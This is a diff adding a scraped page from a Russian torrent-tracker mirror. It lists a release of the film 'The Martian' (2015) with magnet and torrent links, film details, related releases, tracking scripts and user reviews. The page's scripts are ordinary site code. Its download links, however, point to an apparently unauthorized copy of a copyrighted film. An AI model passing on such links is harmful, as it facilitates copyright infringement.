@@ -1,0 +1,359 @@
+
+<html> <head> <meta http-equiv="content-type" content="text/html; charset=utf-8" /> <link href="/parse/s.rutor.org/css.css" rel="stylesheet" type="text/css" media="screen" /> <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" /> <link rel="shortcut icon" href="/parse/s.rutor.org/favicon.ico" /> <title>new-rutor.org :: Марсианин / The Martian (2015) WEB-DLRip от Scarabey | Чистый звук</title> <script type="text/javascript" src="/zax/jquery.min.js"></script> <script type="text/javascript" src="/parse/s.rutor.org/jquery.cookie-min.js"></script> <script type="text/javascript" src="/parse/s.rutor.org/t/functions.js"></script>
+
+
+ <meta name="google-site-verification" content="nOstaYe59mBKwlinAtVTKV1W994sJ-kF6j9igdtwKyc" />
+ <link href="/css/css.css?27047" rel="stylesheet" type="text/css" media="screen">
+ <link href="/css/web-mirror.css?2" rel="stylesheet" type="text/css" media="screen">
+ <script type="text/javascript" src="/southcentral/js.js?08"></script>
+ <script type="text/javascript" src="/css/jquery.tablesorter.new-rutor.min.js?1"></script>
+ <link href="/grannypatries/s.css?12s37" rel="stylesheet" type="text/css" media="screen">
+ <script type="text/javascript" src="/css/pluso-like-small.js?10"></script>
+ <link rel="stylesheet" type="text/css" href="/css/pluso.css?12s5" media="screen" />
+
+
+</head> <body><!-- Yandex.Metrika counter --><script type="text/javascript">var yaParams = {korjik_from: MetrikaParams, server: 'fast'};</script><script type="text/javascript">(function (d, w, c) { (w[c] = w[c] || []).push(function() { try { w.yaCounter22231096 = new Ya.Metrika({id:22231096, clickmap:true, trackLinks:true, accurateTrackBounce:true, trackHash:true,params:yaParams}); } catch(e) { } }); var n = d.getElementsByTagName("script")[0], s = d.createElement("script"), f = function () { n.parentNode.insertBefore(s, n); }; s.type = "text/javascript"; s.async = true; s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js"; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "yandex_metrika_callbacks");</script><noscript><div><img src="//mc.yandex.ru/watch/22231096" style="position:absolute; left:-9999px;" alt="" /></div></noscript><!-- /Yandex.Metrika counter --><!--LI counter--><script type="text/javascript">new Image().src = "//counter.yadro.ru/hit?r" + escape(document.referrer) + ((typeof(screen)=="undefined")?"" : ";s"+screen.width+"*"+screen.height+"*" + (screen.colorDepth?screen.colorDepth:screen.pixelDepth)) + ";u"+escape(document.URL) + ";h"+escape(document.title.substring(0,80)) + ";" +Math.random();</script><!--/LI-->
+
+
+	<div id="main-wrapper">
+
+	<script type='text/javascript' >set_cookie('korjikchange', 1, 2020, 12, 12, '/', www);</script>
+ <div class="headnotice"><b>Внимание!</b> Роскомнадзор всбесился! Добавь зеркала <u>new-rutor.org</u> и <u>xrutor.org</u> в закладки, когда один заблокирован другой работает! Так блокировка не будет иметь значения!</div>
+ <div id='pluso-panel'> <div id='mirror-notice'>Этот сайт - прямое зеркало rutor.org</div>
+
+ <div class='socials_pluss pluso-top'><div class='pluso pluso-theme-light'><a class='pluso-vkontakte'></a><a class='pluso-facebook'></a><a class='pluso-twitter'></a><a class='pluso-odnoklassniki'></a><a class='pluso-google'></a><a class='pluso-moimir'></a></div></div>
+
+ <div class='clr'></div> </div> <div class='clr'></div> <div id="all"> <div id="up"> <div id="logo"> <a href="/"><img src="/rutor-logo.jpg" alt="rutor.org logo" /></a> </div>
+
+	<table id="news_table"> <tr><td colspan="2"><strong>Новости трекера</strong></td></tr>
+	<tr>
+	<td class="news_date">8-Фев</td>
+		<td class="news_title">
+			<noindex><a href="/torrent/178905" target="_blank"  style="color: red; font-weight:bold" id="news91" rel="nofollow">Смена адреса xrutor.org &rarr; LIVE-RUTOR.ORG</a></noindex>
+		</td>
+	</tr>
+	<tr>
+	<td class="news_date">29-Ноя</td>
+		<td class="news_title">
+			<noindex><a href="/torrent/513932" target="_blank" id="news89" rel="nofollow">Друзья, кто знает-помнит Сашу AlexKa...</a></noindex>
+		</td>
+	</tr>
+	<tr>
+		<td class="news_date">09-Окт</td>
+		<td class="news_title">
+			<a href="/torrent/145012" target="_blank" id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a>
+		</td>
+	</tr>
+	</table>
+
+	<script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<81){$("#news81").css({"color":"orange","font-weight":"bold"});}});
+  </script> </div> <div id="menu"> <a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a> <a href="/top" class="menu_b"><div>Топ</div></a> <a href="/categories" class="menu_b"><div>Категории</div></a> <a href="/browse/" class="menu_b"><div>Всё</div></a> <a href="/search/" class="menu_b"><div>Поиск</div></a> <a href="/latest_comments" class="menu_b"><div>Комменты</div></a> <a href="/upload.php" class="menu_b"><div>Залить</div></a>
+  <a title="торрент фильмы, новинки, мультфильмы, свежие раздачи" href="/movies/" class="menu_b movies" rel="nofollow"><div><i>Кино</i></div></a>
+
+  <div id="menu_right_side"></div> <script type="text/javascript">
+$(document).ready(function() {
+	var menu_right;
+	if ($.cookie('COOKIE%253BCOOKIE%2525253Buserid%2525253B%2525252F%2525253Brutor.info%253B%252F'))
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="/parse/s.rutor.org/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout" border="0"><img src="/parse/s.rutor.org/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="/parse/s.rutor.org/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script> </div> <h1>Марсианин / The Martian (2015) WEB-DLRip от Scarabey | Чистый звук</h1> </div> <div id="ws"> <div id="content">
+
+<center class="web-mirror">
+<script>
+webmirror = document.createElement('a');
+webmirror.href='/torrent/178905';
+$(".web-mirror").prepend('<!--noindex--> <noindex> </noindex> <!--/noindex-->');
+$(".web-mirror noindex").append(webmirror);
+$(".web-mirror a").html('<img src="/yo/img/skull-743.jpg" />');
+</script>
+</center>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ <div id="msg1"></div> <script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script> <div id="download"> <a href="magnet:?xt=urn:btih:13ebd86aea3ee9a585878a307f9c93622467fa93&amp;dn=rutor.org_%D0%9C%D0%B0%D1%80%D1%81%D0%B8%D0%B0%D0%BD%D0%B8%D0%BD+%2F+The+Martian+%282015%29+WEB-DLRip+%D0%BE%D1%82+Scarabey+%7C+%D0%A7%D0%B8%D1%81%D1%82%D1%8B%D0%B9+%D0%B7%D0%B2%D1%83%D0%BA&amp;tr=udp://opentor.org:2710&amp;tr=udp://bt.rutor.org:2710&amp;tr=retracker.local/announce"><img src="/parse/s.rutor.org/i/magnet.gif"></a> <!--<a href="/mail.php?send_torrent=478003"><img src="/parse/s.rutor.org/t/mails.png"></a>--> <a href="/parse/d.rutor.org/download/478003"><img src="/parse/s.rutor.org/t/down.png"> Скачать The_Martian_2015_Dub_WEB-DLRip_scarabey.org.torrent</a> <br /> <a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a> <script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script> <a href="#" class="d_small" onclick="addEngine();">Добавить rutor.org в поисковую строку</a> </div> <table width="100%"> <tr><td colspan="2" style="text-align:center;"> <script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script> </td> </tr> </table> <table id="details"> <tr><td style="vertical-align:top;"></td><td><br /><img src="http://img10.lostpic.net/2015/12/23/543f9b1ab1cbda576b289bf7c9294103.th.jpg" /><br /> <br /> <b>Год выпуска</b>: 2015<br /> <b>Страна</b>: США, Великобритания<br /> <b>Жанр</b>:  <a href="/tag/1/фантастика" target="_blank">фантастика</a>, <a href="/tag/1/приключения" target="_blank">приключения</a><br /> <b>Продолжительность</b>: 02:21:44<br /> <b>Перевод</b>: <b>Профессиональный (полное дублирование) [Чистый звук]</b><br /> <b>Субтитры</b>: нет<br /> <br /> <b>Режиссёр</b>: Ридли Скотт / Ridley Scott<br /> <br /> <b>Описание</b>: Марсианская миссия «Арес-3» в процессе работы была вынуждена экстренно покинуть планету из-за надвигающейся песчаной бури. Инженер и биолог Марк Уотни получил повреждение скафандра во время песчаной бури. Сотрудники миссии, посчитав его погибшим, эвакуировались с планеты, оставив Марка одного. Очнувшись, Уотни обнаруживает, что связь с Землёй отсутствует, но при этом полностью функционирует жилой модуль. Главный герой начинает искать способ продержаться на имеющихся запасах еды, витаминов, воды и воздуха ещё 4 года до прилёта следующей миссии «Арес-4».<br /> <br /> <b>Качество видео:</b> <b>WEB-DLRip</b><br /> <b>Формат видео:</b> AVI<br /> <br /> <b>Видео</b>: 720x304 (2.37:1), 23.976 fps, XviD build 73 ~1269 kbps avg, 0.24 bit/pixel<br /> <b>Аудио</b>: 48 kHz, AC3 Dolby Digital, 2/0 (L,R) ch, ~192 kbps <br /> <br /> <b>Релиз от: </b><a href="http://scarabey.org/" target="_blank"><img src="http://scarabey.org/images/hqclub.gif" /></a><br /> <br /> <center><img src="http://lostpic.net/orig_images/2/8/7/287f8a16aa58f4522ee27dbd7096fd32.gif" /><a href="http://scarabey.org/janri/" target="_blank"><b>АНОНСЫ МОИХ РАЗДАЧ!</b></a><img src="http://lostpic.net/orig_images/5/b/1/5b1e6351da9deef1dd34bf220b908c2e.gif" /></center><br /> <br /> <center><a href="http://vk.com/scarabey_new_team" target="_blank"><img src="http://new-team.org/images/vk.jpg" /></a></center><br /> <a href="http://www.kinopoisk.ru/film/841700/" target="_blank"><img src="http://www.kinopoisk.ru/rating/841700.gif" /></a><br /> <div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://lostpic.net/image/MUcd" target="_blank"><img src="http://img10.lostpic.net/2015/12/23/d9c2056a9b75e2aa083ab10ef48cf464.th.png" /></a> <a href="http://lostpic.net/image/MUcG" target="_blank"><img src="http://img10.lostpic.net/2015/12/23/f461d728af253f5246c91677b50f7e91.th.png" /></a> <a href="http://lostpic.net/image/MUcJ" target="_blank"><img src="http://img10.lostpic.net/2015/12/23/a8678b293f7f41d2243f2ce09271f510.th.png" /></a> <a href="http://lostpic.net/image/MUcO" target="_blank"><img src="http://img10.lostpic.net/2015/12/23/c5dd4d8e791cbb794380d7f9084622e0.th.png" /></a></textarea></div></td></tr> <tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr> <tr><td class="header">Категория</td><td><a href="/kino" target="_blank">Зарубежные фильмы</a></td></tr> <tr><td class="header">Раздают</td><td>1393</td></tr> <tr><td class="header">Качают</td><td>29</td></tr> <tr><td class="header">Сидер замечен</td><td> (Никогда)</td></tr> <tr><td class="header">Добавлен</td><td>24-12-2015 20:28:17  (7 минут назад)</td></tr> <tr><td class="header">Размер</td><td>1.45&nbsp;GB  (1555468288 Bytes)</td></tr> <tr> <td class="header" nowrap="nowrap">Добавить в</td> <td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 478003);">закладки</span></td> </tr> <tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>24&nbsp;Дек&nbsp;15</td><td colspan = "2"><a class="downgif" href="/parse/d.rutor.org/download/477998"><img src="/parse/s.rutor.org/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:e1764bb36018e3fb25679a7b55b31aa94bf87363&dn=rutor.org&tr=udp://opentor.org:2710&tr=udp://bt.rutor.org:2710&tr=retracker.local/announce"><img src="/parse/s.rutor.org/i/m.png" alt="M" /></a> <a href="/torrent/477998/marsianin_the-martian-2015-web-dlrip-ot-scarabey-chistyj-zvuk">Марсианин / The Martian (2015) WEB-DLRip от Scarabey | Чистый звук </a></td> <td align="right">800.63&nbsp;MB</td><td align="center"><span class="green"><img src="/parse/s.rutor.org/t/arrowup.gif" alt="S" />&nbsp;0</span>&nbsp;<img src="/parse/s.rutor.org/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="tum"><td>24&nbsp;Дек&nbsp;15</td><td ><a class="downgif" href="/parse/d.rutor.org/download/477930"><img src="/parse/s.rutor.org/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:589d1ea65b4c361b1eda69dd8e096a938fc1782a&dn=rutor.org&tr=udp://opentor.org:2710&tr=udp://bt.rutor.org:2710&tr=retracker.local/announce"><img src="/parse/s.rutor.org/i/m.png" alt="M" /></a> <a href="/torrent/477930/marsianin_the-martian-2015-web-dlrip-kpk-chistyj-zvuk">Марсианин / The Martian (2015) WEB-DLRip | КПК | Чистый звук </a></td> <td align="right">1<img src="/parse/s.rutor.org/i/com.gif" alt="C" /></td> <td align="right">588.68&nbsp;MB</td><td align="center"><span class="green"><img src="/parse/s.rutor.org/t/arrowup.gif" alt="S" />&nbsp;132</span>&nbsp;<img src="/parse/s.rutor.org/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;63</span></td></tr><tr class="gai"><td>24&nbsp;Дек&nbsp;15</td><td colspan = "2"><a class="downgif" href="/parse/d.rutor.org/download/477922"><img src="/parse/s.rutor.org/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:d3735a7fb24b1e56f3f6961ca93a21ebc79c7a68&dn=rutor.org&tr=udp://opentor.org:2710&tr=udp://bt.rutor.org:2710&tr=retracker.local/announce"><img src="/parse/s.rutor.org/i/m.png" alt="M" /></a> <a href="/torrent/477922/marsianin_the-martian-2015-web-dlrip-chistyj-zvuk">Марсианин / The Martian (2015) WEB-DLRip | Чистый звук </a></td> <td align="right">750.06&nbsp;MB</td><td align="center"><span class="green"><img src="/parse/s.rutor.org/t/arrowup.gif" alt="S" />&nbsp;381</span>&nbsp;<img src="/parse/s.rutor.org/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;212</span></td></tr><tr class="tum"><td>24&nbsp;Дек&nbsp;15</td><td ><a class="downgif" href="/parse/d.rutor.org/download/477901"><img src="/parse/s.rutor.org/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:26ea6b27d3f46249974771637962b698f8e48edc&dn=rutor.org&tr=udp://opentor.org:2710&tr=udp://bt.rutor.org:2710&tr=retracker.local/announce"><img src="/parse/s.rutor.org/i/m.png" alt="M" /></a> <a href="/torrent/477901/marsianin_the-martian-2015-web-dl-1080r-chistyj-zvuk">Марсианин / The Martian (2015) WEB-DL 1080р | Чистый звук </a></td> <td align="right">22<img src="/parse/s.rutor.org/i/com.gif" alt="C" /></td> <td align="right">5.08&nbsp;GB</td><td align="center"><span class="green"><img src="/parse/s.rutor.org/t/arrowup.gif" alt="S" />&nbsp;2692</span>&nbsp;<img src="/parse/s.rutor.org/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1717</span></td></tr><tr class="gai"><td>24&nbsp;Дек&nbsp;15</td><td ><a class="downgif" href="/parse/d.rutor.org/download/477888"><img src="/parse/s.rutor.org/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:18f69c4661d4c01a5754d8b67281b43a38eb494f&dn=rutor.org&tr=udp://opentor.org:2710&tr=udp://bt.rutor.org:2710&tr=retracker.local/announce"><img src="/parse/s.rutor.org/i/m.png" alt="M" /></a> <a href="/torrent/477888/marsianin_the-martian-2015-web-dlrip-avc-chistyj-zvuk">Марсианин / The Martian (2015) WEB-DLRip-AVC | Чистый звук </a></td> <td align="right">2<img src="/parse/s.rutor.org/i/com.gif" alt="C" /></td> <td align="right">1.45&nbsp;GB</td><td align="center"><span class="green"><img src="/parse/s.rutor.org/t/arrowup.gif" alt="S" />&nbsp;2012</span>&nbsp;<img src="/parse/s.rutor.org/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;947</span></td></tr><tr class="tum"><td>24&nbsp;Дек&nbsp;15</td><td ><a class="downgif" href="/parse/d.rutor.org/download/477865"><img src="/parse/s.rutor.org/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:655263da2573c57e72ae8cc1a71fcebc1a7b07e1&dn=rutor.org&tr=udp://opentor.org:2710&tr=udp://bt.rutor.org:2710&tr=retracker.local/announce"><img src="/parse/s.rutor.org/i/m.png" alt="M" /></a> <a href="/torrent/477865/marsianin_the-martian-2015-web-dlrip-ot-scarabey-chistyj-zvuk">Марсианин / The Martian (2015) WEB-DLRip от Scarabey | Чистый звук </a></td> <td align="right">5<img src="/parse/s.rutor.org/i/com.gif" alt="C" /></td> <td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="/parse/s.rutor.org/t/arrowup.gif" alt="S" />&nbsp;1584</span>&nbsp;<img src="/parse/s.rutor.org/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;921</span></td></tr><tr class="gai"><td>23&nbsp;Дек&nbsp;15</td><td ><a class="downgif" href="/parse/d.rutor.org/download/477804"><img src="/parse/s.rutor.org/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:0735286fb605c0b63595335a09ce3a0e194c32a6&dn=rutor.org&tr=udp://opentor.org:2710&tr=udp://bt.rutor.org:2710&tr=retracker.local/announce"><img src="/parse/s.rutor.org/i/m.png" alt="M" /></a> <a href="/torrent/477804/marsianin_the-martian-2015-web-dl-720p-chistyj-zvuk">Марсианин / The Martian (2015) WEB-DL 720p | Чистый звук </a></td> <td align="right">67<img src="/parse/s.rutor.org/i/com.gif" alt="C" /></td> <td align="right">4.49&nbsp;GB</td><td align="center"><span class="green"><img src="/parse/s.rutor.org/t/arrowup.gif" alt="S" />&nbsp;8673</span>&nbsp;<img src="/parse/s.rutor.org/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2808</span></td></tr><tr class="tum"><td>23&nbsp;Дек&nbsp;15</td><td ><a class="downgif" href="/parse/d.rutor.org/download/477797"><img src="/parse/s.rutor.org/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:10d753928fc077e739fa02c8391665922bdb380c&dn=rutor.org&tr=udp://opentor.org:2710&tr=udp://bt.rutor.org:2710&tr=retracker.local/announce"><img src="/parse/s.rutor.org/i/m.png" alt="M" /></a> <a href="/torrent/477797/marsianin_the-martian-2015-web-dlrip-chistyj-zvuk">Марсианин / The Martian (2015) WEB-DLRip | Чистый звук </a></td> <td align="right">16<img src="/parse/s.rutor.org/i/com.gif" alt="C" /></td> <td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="/parse/s.rutor.org/t/arrowup.gif" alt="S" />&nbsp;9042</span>&nbsp;<img src="/parse/s.rutor.org/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2350</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/1/0/0/Марсианин" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr> <tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/478003.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1)</u></span></td><td> <div id="displayfiles" style="display:none;max-height:450px;overflow:auto;"> <table id="files"> <tr><td>Название</td><td>Размер</td></tr> <tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody> </table> </div> </td></tr> </table> <br /> <br /> <script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('COOKIE%253BCOOKIE%2525253Buserid%2525253B%2525252F%2525253Brutor.org%253B%252F')) {
+		$("#cem").append(' | <a href="/edit.php?edit=478003">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(478003);">Промодерировать раздачу</span> | <span onclick="confirm_delete(478003);">Удалить</span>');
+		}
+	}
+});
+</script> <strong> <div style="text-align: center;" id="cem"><a href="/comment/478003">Написать комментарий</a> </div> </strong> <br/><br/> <script type="text/javascript"> <!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//--> </script> <script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="/parse/s.rutor.org/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img src="/parse/s.rutor.org/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//--> </script> <table width="100%" cellspacing="0" cellpadding="4"><tr class="c_h">	<td><b>Sodrodas</b></td> 	<td>26-12-2017 15:12:48 (1 час назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Snake_man, в фильме в космическом аппарате есть искусственная гравитация, поэтому их притягивает, так-же у них нету атрофии мышц и костей, следовательно у них нет проблем в этом плане. Искусственная гравитация создается благодаря модулям которые вращаются создавая тем самым центробежную силу которая заменяет силу притяжения. </td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Nito-Nise</b></td> 	<td>27-11-2017 13:38:30 (29 дней назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Наверное, не самое плохое кино на тему фантастики, но после просмотра ощущение, что это бездарно сделанный фильм. &quot;Обливион&quot; (2013) и &quot;Пассажиры&quot; (2016) гораздо лучше.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>MacHaidor</b></td> 	<td>18-03-2016 16:51:04 (22 месяца назад)</td> 	<td>Оценил на: <b>8</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Фильм, конечно, только визуально напоминает серьезную фантастику, в сущности ей не являясь. Что впрочем и понятно. Его старались сделать зрелищным, а не правдоподобным. Получилось ли? Наверное, да. Если не заострять внимание на множестве невероятных натяжек и просто странных моментов, смотреть вполне можно. Просто надо признать его красивым развлекательным фильмом, и не более того. Если же сравнивать по этой шкале со множеством других на космическую тему, то он выглядит весьма прилично. Да, не научная фантастика, да не серьезный, но ведь мы его посмотрели и, в целом, остались довольны. ))<br />
+Это такой Диснейленд для взрослых, только и всего. ))</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Ifearofnapalm</b></td> 	<td>02-03-2016 01:27:10 (22 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Ivan Lovecraft</b> писал:<br />Ну вот, сегодня 29 февраля 2016г. Печеньки раздали, &quot;марсианину&quot; не одной не дали </fieldset><br />
+И правильно сделали.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Ivan Lovecraft</b></td> 	<td>29-02-2016 11:23:57 (22 месяца назад)</td> 	<td></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Ну вот, сегодня 29 февраля 2016г. Печеньки раздали, &quot;марсианину&quot; не одной не дали <img src="/parse/s.rutor.org/t/smilies/spiteful.gif" /></td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Snake_man</b></td> 	<td>28-02-2016 18:13:21 (22 месяца назад)</td> 	<td>Оценил на: <b>8</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Плюсы фильма: Интересный сюжет. Хорошие спецэфекты. Обилие юмора. Великолепная работа оператора, звукорежиссера, всех. Хороший актерский состав. Отличная игра актеров. Хоть фильм и идет два часа, и часто показывают лишь игру одного актера, но пролетают эти два часа не заметно, настолько проникаешься атмосферой фильма, сопереживанием за главным героем, как будто это ты оказываешься один на Марсе.<br />
+Минусы фильма: Немного напрягают штампы, которые есть и в этом фильме. Но, штампы не сильно противные, так, терпимо. Есть моменты которые вызывают не понимание, и напрягают. Например, все знают, что притяжение Марса меньше, притяжения Земли, но главный герой ходит по Марсу, как по Земле, и нигде это уменьшенное притяжение не обыграно даже. Уж кто-кто, но ученым ли не знать разрушительность марсианских бурь? Но нет, нужно обязательно построить свою базу так, чтоб ее бури трепали и повреждали. И снова астронавты ходят по космическому кораблю прямо, как будто они не в космосе, где невесомость, а над Землей летают. Меня раздражают такие моменты в научной фантастике. Не можете снять невесомость, не беритесь, чертовы кинопроизводители. Я думаю многие видели в док фильмах, как космонавты долго приходят в себя после полета в космос. Как их мышцы привыкают к земному притяжению. Как они некоторые время перемещаются на коляске. Но не в этом фильме, нет. Тут главный герой, после года полета в космосе, ходит по Земле, как будто и не улетал никуда в космос. Такие моменты делают этот фильм какой-то сказкой, с претензией на научную фантастику.<br />
+И все равно, не смотря на минусы, я считаю, что фильм все же не плох. Смотрится он интересно. Видно, что денег не пожалели. Если есть куча блокбастеров, где главный герой весь фильм бегает по комнате с зелеными стенами, на которые потом накладывают какие-то не земные пейзажи, то тут видно, что создатели раскошелились и на костюмы, и на технику, и на декорации, и зеленых стен по минимуму. Вот за все за это я бы дал 8 баллов из 10. Хотя фильм, конечно, сказка, местами наивная, но хорошо снятая. Второй раз вряд ли захочется пересмотреть. Как бы все держится на интриге «улетит, не улетит».</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>8ExPLoReR8</b></td> 	<td>26-02-2016 18:39:58 (22 месяца назад)</td> 	<td>Оценил на: <b>10</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>В коллекцию,однозначно.Лучшая фантастика за последние пару лет-100%.</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>STIM333</b></td> 	<td>19-02-2016 12:36:55 (23 месяца назад)</td> 	<td>Оценил на: <b>10</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>Хороший фильмец!!!!</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Труфальдино</b></td> 	<td>17-02-2016 16:46:43 (23 месяца назад)</td> 	<td>Оценил на: <b>8</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" colspan=4>to suvva: Конечно, фильм хорош, даже определенно...Но скотч с целлофаном в разряженной атмосфере-это ФАНТАСТИЧНЕЕ человека-муравья.Картошка на Марсе?И хули???Наши, на самом деле, на Луне редиску рОстили, дай Боже какую )))</td></tr><tr>	<td colspan="4">&nbsp;</td></tr><tr class="c_h">	<td><b>Ivan Lovecraft</b></td> 	<td>17-02-2016 04:45:55 (23 месяца назад)</td> 	<td>Оценил на: <b>6</b></td> 	<td align="right">		<!--span id="c_1987534"></span-->		<!--script type="text/javascript">cOptions(891388,1987534);</script-->	</td></tr><tr>	<td class="c_t" 